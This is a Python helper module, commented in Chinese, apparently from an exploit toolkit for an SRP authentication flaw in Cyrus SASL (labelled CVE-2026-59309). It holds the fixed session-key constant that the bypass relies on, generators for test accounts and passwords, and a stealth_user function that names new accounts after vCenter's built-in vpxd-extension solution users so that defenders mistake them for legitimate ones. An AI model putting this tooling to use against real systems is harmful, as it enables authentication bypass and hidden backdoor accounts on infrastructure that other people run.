"""通用小工具。"""
import secrets
import string
import struct
import hashlib


def rand_name(n=6):
    """随机标识（安全随机）。"""
    return "".join(secrets.choice(string.ascii_lowercase + string.digits)
                   for _ in range(n))


def i2b(x):
    """大整数 → 最小大端字节（BN_bn2bn 语义，0 → b''）。"""
    if x == 0:
        return b""
    return x.to_bytes((x.bit_length() + 7) // 8, "big")


def be32(n):
    return struct.pack(">I", n)


# ---------------------------------------------------------------------------
# [协议保真区] CVE-2026-59309 核心常量：服务端 S = 0 经 BN_bn2bin 后为空字节串，
# 故 K = SHA1(b"") 为公开常量。此 SHA-1 是被攻击协议（Cyrus SASL SRP）的构成，
# 不是本工具自身的加密选择；替换为 SHA-256 会导致利用必然失败。
# ---------------------------------------------------------------------------
SHA1_EMPTY = hashlib.sha1(b"").digest()   # da39a3ee5e6b4b0d3255bfef95601890afd80709


def gen_user():
    """自动生成测试账户名。"""
    return "pentest_" + rand_name(4)


def gen_password():
    """自动生成满足 SSO 复杂度的强密码。"""
    return rand_name(10) + "!Aa1" + rand_name(2)


def human_size(n):
    """字节 → 人类可读（B/KB/MB/GB/TB）；非数字原样返回。"""
    try:
        n = float(n)
    except (TypeError, ValueError):
        return str(n) if n else "?"
    for unit in ("B", "KB", "MB", "GB", "TB", "PB"):
        if abs(n) < 1024 or unit == "PB":
            return "%.1f %s" % (n, unit)
        n /= 1024.0


def stealth_user(prefix="vpxd-extension"):
    """伪装成 vCenter 自带解决方案用户的账户名：
    vpxd-extension-<8位hex>（vCenter 真实存在 vpxd-extension 解决方案用户，
    追加随机后缀避免撞名，迷惑性更强）。"""
    return "%s-%s" % (prefix, secrets.token_hex(4))
